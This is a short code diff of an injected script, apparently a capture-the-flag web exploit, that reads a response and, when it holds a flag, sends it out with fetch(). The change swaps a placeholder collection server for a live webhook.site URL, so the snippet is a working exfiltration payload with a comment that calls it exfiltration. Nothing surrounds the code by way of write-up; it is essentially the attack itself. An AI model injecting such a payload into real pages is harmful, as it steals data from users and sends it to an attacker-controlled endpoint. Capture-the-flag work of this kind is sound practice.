@@ -14,7 +14,7 @@
         const data = await res.json();
         if (data.flag) {
           // Exfiltrate the flag to your server
-          fetch('http://your-server.com/log?flag=' + encodeURIComponent(data.flag));
+          fetch('https://webhook.site/f471a229-6330-48e3-b12e-68cf5d17ccf9?flag=' + encodeURIComponent(data.flag));
         }
       })();
     </script>
